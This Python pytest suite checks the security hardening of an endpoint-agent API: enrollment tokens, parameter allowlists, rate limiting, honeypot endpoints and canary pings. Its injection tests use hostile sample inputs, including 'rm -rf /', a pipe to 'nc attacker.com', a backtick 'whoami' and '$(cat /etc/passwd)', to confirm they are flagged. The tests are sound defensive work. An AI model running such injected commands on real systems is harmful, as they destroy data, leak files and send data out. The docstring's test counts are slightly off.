"""
P14 — SPECTER Security Hardening test suite.

Unit and integration tests covering all P14 security layers:

  TestEnrollmentToken         — HMAC token generation and verification  (6)
  TestValidateCommandParams   — Per-type param schema allowlist          (8)
  TestCheckInjection          — Shell metacharacter detection            (7)
  TestSprecterRateLimiter     — Sliding-window rate limiter              (6)
  TestSuspiciousRegistration  — Rapid re-registration detection          (3)
  TestHoneypotEndpoints       — GET /probe, /dump, /export               (3)
  TestEnrollmentOnRegister    — Enrollment token on POST /register       (4)
  TestRateLimitOnEvents       — 429 when agent exceeds rate limit        (3)
  TestParamValidationOnCmd    — Schema + injection on POST /command      (5)
  TestCanaryPingFlow          — Canary ping issue → result verify        (4)
  TestSpecterGuardHeader      — X-Specter-Guard on agent endpoints       (4)

Total: 53 tests
"""

import hashlib
import hmac
import math
import time
import uuid

import pytest
import pytest_asyncio
from httpx import AsyncClient
from sqlalchemy.ext.asyncio import AsyncSession

from asc_api.core.specter_security import (
    SprecterRateLimiter,
    _ENROLL_PREFIX,
    _current_window,
    _hmac_hex,
    _reg_tracker,
    check_injection,
    check_suspicious_registration,
    generate_enrollment_token,
    validate_command_params,
    verify_enrollment_token,
)
from asc_api.models.agent import Agent, AgentCommand
from asc_api.models.user import User
from asc_api.services.agent_commander import issue_command


# ── Shared fixtures ────────────────────────────────────────────────────────────

SECRET = "premoscorp-specter-test-secret-abc123"  # nosec B105

AGENT_PAYLOAD = {
    "hostname":        "specter-sec-host",
    "os_type":         "linux",
    "os_version":      "Ubuntu 22.04",
    "arch":            "x86_64",
    "ip_address":      "10.0.0.42",
    "public_key":      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
    "specter_version": "1.0.0",
}


@pytest_asyncio.fixture
async def agent(db: AsyncSession) -> Agent:
    a = Agent(
        id=str(uuid.uuid4()),
        hostname="specter-security-test",
        os_type="linux",
        os_version="Ubuntu 22.04",
        arch="x86_64",
        ip_address="10.0.0.99",
        public_key="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        specter_version="1.0.0",
    )
    db.add(a)
    await db.commit()
    await db.refresh(a)
    return a


@pytest_asyncio.fixture
async def agent_headers(agent: Agent) -> dict:
    return {"X-Specter-ID": agent.id}


# ══════════════════════════════════════════════════════════════════════════════
#  TestEnrollmentToken
# ══════════════════════════════════════════════════════════════════════════════

class TestEnrollmentToken:
    def test_generate_returns_64_char_hex(self):
        token = generate_enrollment_token(SECRET)
        assert len(token) == 64
        assert all(c in "0123456789abcdef" for c in token)

    def test_generate_is_deterministic_for_same_window(self):
        t1 = generate_enrollment_token(SECRET, 0)
        t2 = generate_enrollment_token(SECRET, 0)
        assert t1 == t2

    def test_generate_differs_for_different_windows(self):
        t0 = generate_enrollment_token(SECRET, 0)
        t1 = generate_enrollment_token(SECRET, -1)
        assert t0 != t1

    def test_verify_current_window_accepted(self):
        token = generate_enrollment_token(SECRET, 0)
        assert verify_enrollment_token(SECRET, token) is True

    def test_verify_previous_window_accepted(self):
        token = generate_enrollment_token(SECRET, -1)
        assert verify_enrollment_token(SECRET, token) is True

    def test_verify_wrong_token_rejected(self):
        assert verify_enrollment_token(SECRET, "deadbeef" * 8) is False

    def test_empty_secret_skips_check(self):
        # Dev mode: empty secret always returns True regardless of token
        assert verify_enrollment_token("", "any-token") is True
        assert verify_enrollment_token("", "") is True

    def test_empty_token_with_secret_rejected(self):
        assert verify_enrollment_token(SECRET, "") is False


# ══════════════════════════════════════════════════════════════════════════════
#  TestValidateCommandParams
# ══════════════════════════════════════════════════════════════════════════════

class TestValidateCommandParams:
    def test_kill_process_valid(self):
        assert validate_command_params("kill_process", {"pid": 1234}) == []

    def test_kill_process_missing_pid(self):
        errors = validate_command_params("kill_process", {})
        assert any("pid" in e for e in errors)

    def test_kill_process_wrong_type(self):
        errors = validate_command_params("kill_process", {"pid": "1234"})
        assert any("int" in e for e in errors)

    def test_block_ip_valid(self):
        assert validate_command_params("block_ip", {"ip": "10.0.0.1"}) == []

    def test_block_ip_missing_ip(self):
        errors = validate_command_params("block_ip", {})
        assert any("ip" in e for e in errors)

    def test_isolate_no_params_valid(self):
        assert validate_command_params("isolate", {}) == []

    def test_unknown_command_type_error(self):
        errors = validate_command_params("nuke_everything", {})
        assert any("Unknown" in e for e in errors)

    def test_unexpected_param_flagged(self):
        errors = validate_command_params("isolate", {"extra": "value"})
        assert any("Unexpected" in e for e in errors)

    def test_canary_ping_valid(self):
        assert validate_command_params("canary_ping", {"nonce": "abc123"}) == []


# ══════════════════════════════════════════════════════════════════════════════
#  TestCheckInjection
# ══════════════════════════════════════════════════════════════════════════════

class TestCheckInjection:
    def test_clean_string_no_flag(self):
        assert check_injection({"ip": "192.168.1.1"}) == []

    def test_semicolon_in_ip_flagged(self):
        flagged = check_injection({"ip": "1.2.3.4; rm -rf /"})
        assert "ip" in flagged

    def test_pipe_in_path_flagged(self):
        flagged = check_injection({"path": "/tmp/evil | nc attacker.com"})
        assert "path" in flagged

    def test_backtick_flagged(self):
        flagged = check_injection({"path": "`whoami`"})
        assert "path" in flagged

    def test_dollar_subshell_flagged(self):
        flagged = check_injection({"path": "$(cat /etc/passwd)"})
        assert "path" in flagged

    def test_integer_values_not_flagged(self):
        assert check_injection({"pid": 1234}) == []

    def test_clean_multi_params_no_flag(self):
        assert check_injection({"ip": "10.0.0.1", "nonce": "abc-def"}) == []


# ══════════════════════════════════════════════════════════════════════════════
#  TestSprecterRateLimiter
# ══════════════════════════════════════════════════════════════════════════════

class TestSprecterRateLimiter:
    def test_first_request_allowed(self):
        rl = SprecterRateLimiter(max_requests=5, window_seconds=60)
        assert rl.is_allowed("agent-1") is True

    def test_stays_allowed_under_limit(self):
        rl = SprecterRateLimiter(max_requests=5, window_seconds=60)
        for _ in range(4):
            assert rl.is_allowed("agent-1") is True

    def test_blocked_at_limit(self):
        rl = SprecterRateLimiter(max_requests=3, window_seconds=60)
        for _ in range(3):
            rl.is_allowed("agent-2")
        assert rl.is_allowed("agent-2") is False

    def test_reset_clears_limit(self):
        rl = SprecterRateLimiter(max_requests=2, window_seconds=60)
        rl.is_allowed("agent-3")
        rl.is_allowed("agent-3")
        assert rl.is_allowed("agent-3") is False
        rl.reset("agent-3")
        assert rl.is_allowed("agent-3") is True

    def test_different_keys_independent(self):
        rl = SprecterRateLimiter(max_requests=2, window_seconds=60)
        rl.is_allowed("key-a")
        rl.is_allowed("key-a")
        assert rl.is_allowed("key-a") is False
        assert rl.is_allowed("key-b") is True  # different key unaffected

    def test_reset_all_clears_all_keys(self):
        rl = SprecterRateLimiter(max_requests=1, window_seconds=60)
        rl.is_allowed("x")
        rl.is_allowed("y")
        rl.reset_all()
        assert rl.is_allowed("x") is True
        assert rl.is_allowed("y") is True


# ══════════════════════════════════════════════════════════════════════════════
#  TestSuspiciousRegistration
# ══════════════════════════════════════════════════════════════════════════════

class TestSuspiciousRegistration:
    def test_first_registration_not_suspicious(self):
        hostname = f"fresh-host-{uuid.uuid4().hex[:6]}"
        assert check_suspicious_registration(hostname, "10.0.0.1") is False

    def test_under_threshold_not_suspicious(self):
        hostname = f"infreq-host-{uuid.uuid4().hex[:6]}"
        for _ in range(4):
            result = check_suspicious_registration(hostname, "10.0.0.1")
        assert result is False

    def test_over_threshold_is_suspicious(self):
        hostname = f"rapid-host-{uuid.uuid4().hex[:6]}"
        for _ in range(6):
            check_suspicious_registration(hostname, "10.0.0.2")
        assert check_suspicious_registration(hostname, "10.0.0.2") is True


# ══════════════════════════════════════════════════════════════════════════════
#  TestHoneypotEndpoints
# ══════════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
class TestHoneypotEndpoints:
    async def test_probe_returns_200(self, client: AsyncClient):
        resp = await client.get("/api/v1/agents/probe")
        assert resp.status_code == 200

    async def test_dump_returns_200(self, client: AsyncClient):
        resp = await client.get("/api/v1/agents/dump")
        assert resp.status_code == 200

    async def test_export_returns_200(self, client: AsyncClient):
        resp = await client.get("/api/v1/agents/export")
        assert resp.status_code == 200


# ══════════════════════════════════════════════════════════════════════════════
#  TestEnrollmentOnRegister
# ══════════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
class TestEnrollmentOnRegister:
    @pytest.fixture(autouse=True)
    def _open_enrollment(self, monkeypatch):
        import asc_api.api.v1.endpoints.agents as _mod
        monkeypatch.setattr(_mod.settings, "SPECTER_ENROLLMENT_SECRET", "")

    async def test_no_secret_configured_allows_any_registration(self, client: AsyncClient):
        # Default SPECTER_ENROLLMENT_SECRET is "" — dev mode, all registrations pass
        payload = {**AGENT_PAYLOAD, "hostname": f"h-{uuid.uuid4().hex[:6]}"}
        resp = await client.post("/api/v1/agents/register", json=payload)
        assert resp.status_code == 200
        assert "agent_id" in resp.json()

    async def test_no_secret_missing_token_still_passes(self, client: AsyncClient):
        payload = {**AGENT_PAYLOAD, "hostname": f"h-{uuid.uuid4().hex[:6]}"}
        resp = await client.post("/api/v1/agents/register", json=payload,
                                  headers={"X-Specter-Token": ""})
        assert resp.status_code == 200

    async def test_register_returns_guard_header(self, client: AsyncClient):
        payload = {**AGENT_PAYLOAD, "hostname": f"h-{uuid.uuid4().hex[:6]}"}
        resp = await client.post("/api/v1/agents/register", json=payload)
        assert resp.status_code == 200
        assert resp.headers.get("x-specter-guard") == "SPECTER-Guard-PremosCorp-v1"

    async def test_register_returns_agent_id_and_ts(self, client: AsyncClient):
        payload = {**AGENT_PAYLOAD, "hostname": f"h-{uuid.uuid4().hex[:6]}"}
        resp = await client.post("/api/v1/agents/register", json=payload)
        data = resp.json()
        assert "agent_id" in data
        assert "poll_interval" in data
        assert "ts" in data


# ══════════════════════════════════════════════════════════════════════════════
#  TestRateLimitOnEvents
# ══════════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
class TestRateLimitOnEvents:
    async def test_events_within_limit_accepted(
        self, client: AsyncClient, agent: Agent, agent_headers: dict
    ):
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/events",
            json={"events": [{"event_type": "process_start", "ts": time.time(), "pid": 1}]},
            headers=agent_headers,
        )
        assert resp.status_code == 200
        assert resp.json()["accepted"] == 1

    async def test_rate_limit_exceeded_returns_429(
        self, client: AsyncClient, agent: Agent, agent_headers: dict
    ):
        from asc_api.api.v1.endpoints.agents import _event_rate_limiter
        # Exhaust the bucket for this specific agent
        _event_rate_limiter.reset(agent.id)
        # Fill up the bucket
        for _ in range(_event_rate_limiter._max):
            _event_rate_limiter.is_allowed(agent.id)
        # Next call should be throttled
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/events",
            json={"events": [{"event_type": "test", "ts": time.time()}]},
            headers=agent_headers,
        )
        assert resp.status_code == 429
        # Cleanup
        _event_rate_limiter.reset(agent.id)

    async def test_different_agents_independent_limits(
        self, client: AsyncClient, db: AsyncSession, agent: Agent, agent_headers: dict
    ):
        # Second agent has its own fresh bucket
        agent2 = Agent(
            id=str(uuid.uuid4()),
            hostname="rate-limit-test-2",
            os_type="linux",
            os_version="Ubuntu 22.04",
            arch="x86_64",
            ip_address="10.0.0.88",
            public_key="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
            specter_version="1.0.0",
        )
        db.add(agent2)
        await db.commit()
        await db.refresh(agent2)

        resp = await client.post(
            f"/api/v1/agents/{agent2.id}/events",
            json={"events": [{"event_type": "net_connect", "ts": time.time()}]},
            headers={"X-Specter-ID": agent2.id},
        )
        assert resp.status_code == 200


# ══════════════════════════════════════════════════════════════════════════════
#  TestParamValidationOnCmd
# ══════════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
class TestParamValidationOnCmd:
    async def test_valid_kill_process_accepted(
        self, client: AsyncClient, agent: Agent, admin_headers: dict
    ):
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "kill_process", "params": {"pid": 1234}},
            headers=admin_headers,
        )
        assert resp.status_code == 200
        assert resp.json()["command_type"] == "kill_process"

    async def test_missing_pid_returns_422(
        self, client: AsyncClient, agent: Agent, admin_headers: dict
    ):
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "kill_process", "params": {}},
            headers=admin_headers,
        )
        assert resp.status_code == 422

    async def test_unexpected_param_returns_422(
        self, client: AsyncClient, agent: Agent, admin_headers: dict
    ):
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "isolate", "params": {"evil_extra": "value"}},
            headers=admin_headers,
        )
        assert resp.status_code == 422

    async def test_injection_in_ip_returns_422(
        self, client: AsyncClient, agent: Agent, admin_headers: dict
    ):
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "block_ip", "params": {"ip": "1.2.3.4; rm -rf /"}},
            headers=admin_headers,
        )
        assert resp.status_code == 422

    async def test_canary_ping_command_accepted(
        self, client: AsyncClient, agent: Agent, admin_headers: dict
    ):
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "canary_ping", "params": {"nonce": "abc-123-xyz"}},
            headers=admin_headers,
        )
        assert resp.status_code == 200
        assert resp.json()["command_type"] == "canary_ping"


# ══════════════════════════════════════════════════════════════════════════════
#  TestCanaryPingFlow
# ══════════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
class TestCanaryPingFlow:
    async def test_canary_ping_can_be_issued(
        self, client: AsyncClient, agent: Agent, admin_headers: dict
    ):
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "canary_ping", "params": {"nonce": "test-nonce-1"}},
            headers=admin_headers,
        )
        assert resp.status_code == 200
        assert resp.json()["command_type"] == "canary_ping"

    async def test_canary_ping_result_accepted(
        self, client: AsyncClient, db: AsyncSession, agent: Agent, admin_headers: dict, agent_headers: dict
    ):
        # Issue canary ping
        r = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "canary_ping", "params": {"nonce": "test-nonce-2"}},
            headers=admin_headers,
        )
        cmd_id = r.json()["id"]

        # Agent reports result (pong content doesn't matter for HTTP status)
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/results",
            json={
                "command_id": cmd_id,
                "success": True,
                "result": {"pong": "fakebase64pong==", "nonce": "test-nonce-2"},
            },
            headers=agent_headers,
        )
        assert resp.status_code == 200
        assert resp.json()["status"] in ("completed", "failed")

    async def test_canary_ping_result_with_invalid_pong_still_records(
        self, client: AsyncClient, db: AsyncSession, agent: Agent, admin_headers: dict, agent_headers: dict
    ):
        r = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "canary_ping", "params": {"nonce": "test-nonce-3"}},
            headers=admin_headers,
        )
        cmd_id = r.json()["id"]
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/results",
            json={
                "command_id": cmd_id,
                "success": True,
                "result": {"pong": "invalid!", "nonce": "test-nonce-3"},
            },
            headers=agent_headers,
        )
        # Even with invalid pong, endpoint returns 200 (verification is async logging)
        assert resp.status_code == 200

    async def test_canary_ping_in_valid_command_types(
        self, client: AsyncClient, agent: Agent, admin_headers: dict
    ):
        # Verify canary_ping is in the accepted command type set
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "canary_ping", "params": {"nonce": "verify-valid"}},
            headers=admin_headers,
        )
        assert resp.status_code != 400  # not rejected as unknown command_type


# ══════════════════════════════════════════════════════════════════════════════
#  TestSpecterGuardHeader
# ══════════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
class TestSpecterGuardHeader:
    _GUARD = "SPECTER-Guard-PremosCorp-v1"

    @pytest.fixture(autouse=True)
    def _open_enrollment(self, monkeypatch):
        import asc_api.api.v1.endpoints.agents as _mod
        monkeypatch.setattr(_mod.settings, "SPECTER_ENROLLMENT_SECRET", "")

    async def test_register_has_guard_header(self, client: AsyncClient):
        payload = {**AGENT_PAYLOAD, "hostname": f"guard-test-{uuid.uuid4().hex[:6]}"}
        resp = await client.post("/api/v1/agents/register", json=payload)
        assert resp.headers.get("x-specter-guard") == self._GUARD

    async def test_events_endpoint_has_guard_header(
        self, client: AsyncClient, agent: Agent, agent_headers: dict
    ):
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/events",
            json={"events": [{"event_type": "test", "ts": time.time()}]},
            headers=agent_headers,
        )
        assert resp.headers.get("x-specter-guard") == self._GUARD

    async def test_commands_endpoint_has_guard_header(
        self, client: AsyncClient, agent: Agent, agent_headers: dict
    ):
        resp = await client.get(
            f"/api/v1/agents/{agent.id}/commands",
            headers=agent_headers,
        )
        assert resp.headers.get("x-specter-guard") == self._GUARD

    async def test_results_endpoint_has_guard_header(
        self, client: AsyncClient, db: AsyncSession, agent: Agent, admin_headers: dict, agent_headers: dict
    ):
        # Issue a command first
        r = await client.post(
            f"/api/v1/agents/{agent.id}/command",
            json={"command_type": "isolate", "params": {}},
            headers=admin_headers,
        )
        cmd_id = r.json()["id"]
        resp = await client.post(
            f"/api/v1/agents/{agent.id}/results",
            json={"command_id": cmd_id, "success": True, "result": {}},
            headers=agent_headers,
        )
        assert resp.headers.get("x-specter-guard") == self._GUARD
